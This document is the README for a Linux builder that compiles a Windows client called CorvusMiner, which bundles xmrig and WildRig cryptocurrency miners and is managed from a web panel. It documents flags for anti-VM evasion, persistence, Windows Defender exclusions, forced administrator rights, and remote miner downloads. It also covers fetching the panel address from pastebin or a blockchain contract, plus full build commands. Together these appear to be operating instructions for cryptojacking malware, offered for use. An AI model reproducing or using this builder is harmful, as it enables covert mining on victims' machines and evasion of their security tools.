# CorvusMiner Linux CLI Builder

Non-interactive builder for the Windows client. It cross-compiles `Client/` into
`corvus.exe` with MinGW-w64 and exposes every setting as a command line flag (or
JSON file) so the panel can drive builds without a GUI.

- Targets Linux (or any POSIX host with a MinGW-w64 cross toolchain). On Windows the
  panel drives `Builder/build.ps1` instead, with the same settings and JSON result.
- No UI, no prompts: any invalid configuration fails immediately with exit code `2`.
- Never mutates the repository: sources are staged into a temp directory per build,
  so concurrent builds are safe.
- Same flag contract the panel uses (`-panel-urls`, `-output`, `-monitoring`,
  `-debug`, `-antivm`, `-persistence`, `-remote-miners`), plus the rest of the
  Windows builder's settings.

## Requirements

| Tool | Purpose | Install (Debian/Ubuntu) |
|------|---------|-------------------------|
| Go 1.21+ | Build the builder itself | `sudo apt install golang-go` |
| CMake 3.10+ | Configure the client | `sudo apt install cmake` |
| MinGW-w64 | Cross compiler (`x86_64-w64-mingw32-*`) | `sudo apt install mingw-w64` |
| GNU make | CMake's default generator | `sudo apt install build-essential` |
| Python 3 | Post-link PE string patcher | `sudo apt install python3` |

One-shot setup (apt/dnf/yum/pacman/zypper/apk, skips what is already present):

```bash
./install-deps.sh            # install missing packages
./install-deps.sh --check    # report only, install nothing
./install-deps.sh --build    # install, then produce ../builder
```

On Windows the panel uses `Builder/build.ps1` instead; run `Builder/install-deps.ps1`
once to get the same toolchain (`-Check` to verify, `-Build` to also emit `builder.exe`).

## Build the builder

```bash
cd BuilderCLI
go build -trimpath -ldflags="-s -w" -o ../builder .
```

The panel looks for `../builder` relative to its own directory, which is where the
command above puts it. `CORVUS_BUILDER` can point at a different location.

## Quick start

```bash
# POST config mode: client reports to the panel
./builder -panel-urls https://panel.example.com/api/miners/submit

# GET config mode: client downloads a JSON config from a static URL
./builder -config-url https://pastebin.com/raw/xxxx -output dist

# Fully loaded build
./builder \
  -panel-urls "https://panel.example.com/api/miners/submit,https://backup.example.com/api/miners/submit" \
  -antivm -persistence -debug -admin -defender-exclusion -remote-miners \
  -embedded-config ./embedded_config.json \
  -output dist -name corvus.exe -jobs 8
```

The artifact is written to `<output>/<name>` (default `dist/corvus.exe`).

## Options

### Configuration source

At least one of `-panel-urls`, `-config-url` or `-contract-address` is required.

| Flag | Description |
|------|-------------|
| `-panel-urls <urls>` | Comma-separated panel submit URLs (POST config mode). Also used for remote miner downloads and updates. |
| `-config-url <urls>` | Comma-separated GET config URLs. Switches the client to GET config mode. Cannot be combined with `-contract-address`. |
| `-contract-address <0x...>` | TextStorage contract address; the client reads the panel URL from the chain at startup. |
| `-embedded-config <path\|auto\|none>` | JSON embedded as an offline fallback. The panel passes an explicit temp file it generates from its stored setting (or `none`). `auto` (default when run by hand) uses `embedded_config.json` at the repo root, `Client/resources/embedded_config.json`, or the parent directory, whichever exists first. |
| `-config <file\|->` | Read all settings from a JSON file (`-` = stdin). Explicitly passed flags override the file. |

`-panel-urls` and `-config-url` may be combined: the config method becomes GET while
the panel URLs still serve remote miner downloads and updates. URLs must be `http`/`https`;
quotes, backslashes and whitespace are rejected because the values are compiled into
C++ string literals.

### Features

| Flag | Default | Compile definition |
|------|---------|--------------------|
| `-antivm` | off | `ENABLE_ANTIVM` |
| `-persistence` | off | `ENABLE_PERSISTENCE` |
| `-debug` | off | `ENABLE_DEBUG_CONSOLE` (console subsystem instead of GUI) |
| `-admin` | off | `ENABLE_ADMIN_MANIFEST` (requireAdministrator manifest) |
| `-defender-exclusion` | off | `ENABLE_DEFENDER_EXCLUSION` |
| `-cpu-miner` | on | `ENABLE_CPU_MINER` (embeds `resources/xmrig.exe`) |
| `-gpu-miner` | off | `ENABLE_GPU_MINER` (embeds `resources/wildrig.exe`) |
| `-remote-miners` | off | `ENABLE_REMOTE_MINERS` (download from panel). Miners selected with `-cpu-miner`/`-gpu-miner` are still embedded as an offline fallback, so a remote build with the GPU miner embedded is ~42 MB. Pass `-cpu-miner=false -gpu-miner=false -remote-miners` for a download-only binary (~2.3 MB). |
| `-monitoring` | off | none — process monitoring is applied from panel config at runtime; accepted for panel compatibility |

### Build behaviour

| Flag | Default | Description |
|------|---------|-------------|
| `-output <dir>` | `dist` | Output directory (created if missing). |
| `-name <file>` | `corvus.exe` | Output file name; must not contain a path. |
| `-source <dir>` | auto | Path to `Client/`. Auto-detected by walking up from the working directory. |
| `-toolchain <file>` | generated | Custom CMake toolchain file. By default a MinGW-w64 toolchain is generated per build. |
| `-jobs <n>` | CPU count | Parallel compile jobs. |
| `-timeout <dur>` | `30m` | Overall build timeout. |
| `-keep-build` | off | Keep the staging directory and report it in `build_dir`. |
| `-dry-run` | off | Print the resolved configuration and the exact CMake commands, build nothing. |
| `-json` | off | Emit one JSON object on stdout; all progress goes to stderr. |
| `-quiet` | off | Suppress `[INFO]`/`[SUCCESS]` progress lines. |
| `-version` | | Print the builder version. |

## JSON configuration

Pass a file with `-config` (or pipe it to `-config -`). Unknown keys are ignored, so
the panel can forward its own build request document. Keys use the panel's
`snake_case` naming; `anti_vm` and `process_monitoring` are accepted as aliases.

```json
{
  "panel_urls": "https://panel.example.com/api/miners/submit",
  "config_url": "",
  "contract_address": "",
  "embedded_config": "auto",
  "process_monitoring": false,
  "anti_vm": true,
  "persistence": false,
  "debug_console": false,
  "admin_manifest": false,
  "defender_exclusion": false,
  "cpu_miner": true,
  "gpu_miner": false,
  "remote_miners": false,
  "output": "dist",
  "name": "corvus.exe",
  "jobs": 4,
  "timeout_seconds": 1800,
  "keep_build": false,
  "dry_run": false
}
```

Omitted keys keep their defaults; flags passed on the command line win.

## Panel integration

The panel exposes a **Builder** page (`/builder`) and drives this CLI directly, so
the same settings are available from the web UI:

| Panel control | Builder flag |
|---------------|--------------|
| Panel URL(s) | `-panel-urls` |
| Config GET URL | `-config-url` |
| Contract address | `-contract-address` |
| Embedded fallback config | `-embedded-config` |
| CPU / GPU / remote miners | `-cpu-miner` / `-gpu-miner` / `-remote-miners` |
| Anti-VM, persistence, debug console | `-antivm` / `-persistence` / `-debug` |
| Require admin, Defender exclusion | `-admin` / `-defender-exclusion` |
| Process monitoring | `-monitoring` (accepted, runtime-only) |
| Output file name | `-name` |

The panel always invokes the builder with `-json` and reads the returned document,
so build failures surface the CLI error plus a tail of the compiler output:

```bash
./builder -output <Panel>/static/builds -name corvus_<ts>.exe \
          -source <repo>/Client -json \
          -panel-urls https://panel.example.com/api/miners/submit \
          -antivm -persistence -cpu-miner=true -gpu-miner=false
```

Built binaries stay in `Panel/static/builds/` and are downloadable from the page.

Environment overrides for packaged deployments:

| Variable | Purpose |
|----------|---------|
| `CORVUS_BUILDER` | Absolute path to the `builder` executable |
| `CORVUS_CLIENT_SOURCE` | Absolute path to the `Client/` source directory |

Notes:

- Exit code `0` = success, `1` = build/tool failure, `2` = invalid configuration,
  `124` = timeout. The panel treats anything non-zero as a failure.
- Builds run in parallel safely; each run gets its own staging directory and the
  artifact is published with an atomic rename, so two panel requests cannot
  corrupt each other.

## How a build runs

1. Preflight: check `cmake`, `x86_64-w64-mingw32-{gcc,g++,windres}`, miner resources and the embedded config JSON.
2. Stage `Client/` into a temp directory (skipping `build/`, `backup/`, `dist/`).
3. Patch `src/main.cpp` so `panelUrlsStr` / `configGetUrlStr` contain the requested
   URLs; a missing pattern is a hard error rather than a silently wrong binary.
4. Generate a MinGW-w64 CMake toolchain file.
5. `cmake -S … -B …` with the `ENABLE_*` definitions, then `cmake --build … --parallel <jobs>`.
6. Copy `corvus.exe` to the output directory atomically and report size + SHA-256.

## Troubleshooting

| Symptom | Fix |
|---------|-----|
| `missing required tool(s): cmake, x86_64-w64-mingw32-gcc…` | `sudo apt install cmake mingw-w64` |
| `GPU miner (WildRig) resource not found: …/resources/wildrig.exe` | Add `wildrig.exe` to `Client/resources/` or drop `-gpu-miner`. |
| `expected exactly one match in src/main.cpp` | The `panelUrlsStr`/`configGetUrlStr` declarations in `Client/src/main.cpp` were renamed or removed. |
| `could not locate Client/CMakeLists.txt` | Run from the repository root or pass `-source /path/to/Client`. |
| Build times out | Raise `-timeout` (e.g. `-timeout 45m`) or lower `-jobs` on small machines. |
